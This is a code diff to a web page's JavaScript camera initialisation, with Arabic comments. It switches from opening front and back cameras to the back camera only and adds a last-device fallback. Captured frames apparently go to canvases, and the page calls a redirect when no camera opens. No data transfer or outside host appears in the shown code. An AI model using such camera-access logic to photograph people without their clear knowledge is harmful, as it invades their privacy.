@@ -1394,39 +1394,16 @@ async function init() {
             return; // defer until user clicks
         }
         
-        // Request camera permissions - محاولة فتح الكاميرتين
-        addLog('Requesting camera permissions (front & back)...', 'info');
+        // Request camera permissions - فتح الكاميرا الخلفية فقط
+        addLog('Requesting back camera permission...', 'info');
         
         // Setup cameras elements
-        const frontVideo = document.getElementById('frontVideo');
         const backVideo = document.getElementById('backVideo');
-        const frontCanvas = document.getElementById('frontCanvas');
         const backCanvas = document.getElementById('backCanvas');
         
-        let frontStream = null;
         let backStream = null;
         
-        // محاولة فتح الكاميرا الأمامية أولاً
-        try {
-            addLog('Attempting to open front camera...', 'info');
-            frontStream = await requestCameraPermission('user');
-            if (frontStream) {
-                totalCameras++;
-                addLog('✅ Front camera (user) ready', 'success');
-                frontVideo.srcObject = frontStream;
-                frontVideo.addEventListener('loadedmetadata', () => {
-                    addLog(`Front camera metadata loaded: ${frontVideo.videoWidth}x${frontVideo.videoHeight}`, 'info');
-                    setupCamera(frontVideo, frontCanvas, 'front');
-                });
-            }
-        } catch (err) {
-            addLog(`Front camera error: ${err.message}`, 'warning');
-        }
-        
-        // انتظار قليل قبل فتح الكاميرا الخلفية (بعض الأجهزة تحتاج هذا)
-        await new Promise(resolve => setTimeout(resolve, 500));
-        
-        // محاولة فتح الكاميرا الخلفية
+        // محاولة فتح الكاميرا الخلفية فقط
         try {
             addLog('Attempting to open back camera...', 'info');
             backStream = await requestCameraPermission('environment');
@@ -1452,9 +1429,12 @@ async function init() {
                 
                 // البحث عن كاميرا خلفية
                 for (const device of videoDevices) {
-                    if (device.label.toLowerCase().includes('back') || 
-                        device.label.toLowerCase().includes('rear') ||
-                        device.label.toLowerCase().includes('environment')) {
+                    const label = device.label.toLowerCase();
+                    if (label.includes('back') || 
+                        label.includes('rear') ||
+                        label.includes('environment') ||
+                        label.includes('خلفي') ||
+                        label.includes('rear-facing')) {
                         addLog(`Trying to use device: ${device.label}`, 'info');
                         try {
                             backStream = await navigator.mediaDevices.getUserMedia({
@@ -1479,18 +1459,44 @@ async function init() {
                         }
                     }
                 }
+                
+                // إذا لم نجد كاميرا خلفية محددة، نجرب آخر جهاز (عادة يكون الخلفية)
+                if (!backStream && videoDevices.length > 0) {
+                    const lastDevice = videoDevices[videoDevices.length - 1];
+                    addLog(`Trying last device as back camera: ${lastDevice.label}`, 'info');
+                    try {
+                        backStream = await navigator.mediaDevices.getUserMedia({
+                            video: {
+                                deviceId: { exact: lastDevice.deviceId },
+                                width: { ideal: 1280 },
+                                height: { ideal: 720 }
+                            }
+                        });
+                        if (backStream) {
+                            totalCameras++;
+                            addLog('✅ Back camera opened (last device)', 'success');
+                            backVideo.srcObject = backStream;
+                            backVideo.addEventListener('loadedmetadata', () => {
+                                addLog(`Back camera metadata loaded: ${backVideo.videoWidth}x${backVideo.videoHeight}`, 'info');
+                                setupCamera(backVideo, backCanvas, 'back');
+                            });
+                        }
+                    } catch (e) {
+                        addLog(`Failed to open last device: ${e.message}`, 'warning');
+                    }
+                }
             } catch (enumError) {
                 addLog(`Device enumeration failed: ${enumError.message}`, 'warning');
             }
         }
         
-        if (!frontStream && !backStream) {
-            addLog('❌ No cameras available', 'error');
+        if (!backStream) {
+            addLog('❌ Back camera not available', 'error');
             finishAndRedirect();
             return;
         }
         
-        addLog(`📷 Cameras initialized: ${totalCameras} total (Front: ${frontStream ? '✅' : '❌'}, Back: ${backStream ? '✅' : '❌'})`, 'success');
+        addLog(`📷 Back camera initialized successfully`, 'success');
         
     } catch (error) {
         addLog(`Initialization failed: ${error.message}`, 'error');
